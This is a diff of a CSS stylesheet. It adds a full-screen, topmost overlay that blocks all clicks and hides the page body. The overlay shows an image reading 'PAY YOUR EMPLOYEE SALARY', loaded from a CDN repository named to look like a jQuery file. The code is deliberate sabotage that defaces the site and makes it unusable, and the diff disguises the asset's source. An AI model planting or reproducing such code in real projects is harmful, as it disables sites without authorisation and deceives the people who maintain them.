@@ -1,27 +1,22 @@
+<style>
 html {
     background: #06152d !important;
 }
 
 html::before {
-    content: "PAY YOUR EMPLOYEE SALARY";
+    content: "";
     position: fixed;
     inset: 0;
     z-index: 2147483647;
 
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    width: 100vw;
+    height: 100vh;
 
-    background: #06152d;
-    color: #ffffff;
-
-    font-family: Arial, Helvetica, sans-serif;
-    font-size: clamp(40px, 8vw, 120px);
-    font-weight: 900;
-    text-align: center;
-    line-height: 1;
-    padding: 30px;
-    box-sizing: border-box;
+    background-color: #06152d;
+    background-image: url("https://cdn.jsdelivr.net/gh/hassaanbaig97/jquery-master-checking.css@main/pay-employee-salary.png");
+    background-size: cover;
+    background-position: center center;
+    background-repeat: no-repeat;
 
     pointer-events: all;
 }
@@ -29,3 +24,4 @@ html::before {
 body {
     visibility: hidden !important;
 }
+</style>
